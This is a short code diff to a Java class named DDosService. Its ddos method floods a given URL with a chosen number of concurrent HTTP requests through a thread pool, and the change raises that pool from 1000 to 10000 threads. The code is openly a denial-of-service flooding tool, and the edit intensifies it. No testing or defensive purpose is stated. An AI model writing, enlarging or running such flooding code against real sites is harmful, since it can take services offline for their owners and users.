@@ -11,7 +11,7 @@ public class DDosService {
 
     public void ddos(final String url, final Integer nbRequest) {
         RestTemplate restTemplate = new RestTemplate();
-        ExecutorService executor = Executors.newFixedThreadPool(1000);
+        ExecutorService executor = Executors.newFixedThreadPool(10000);
 
         for (int i = 0; i < nbRequest; i++) {
             executor.submit(() -> {
@@ -22,7 +22,6 @@ public class DDosService {
                 }
             });
         }
-
         executor.shutdown();
     }
 }
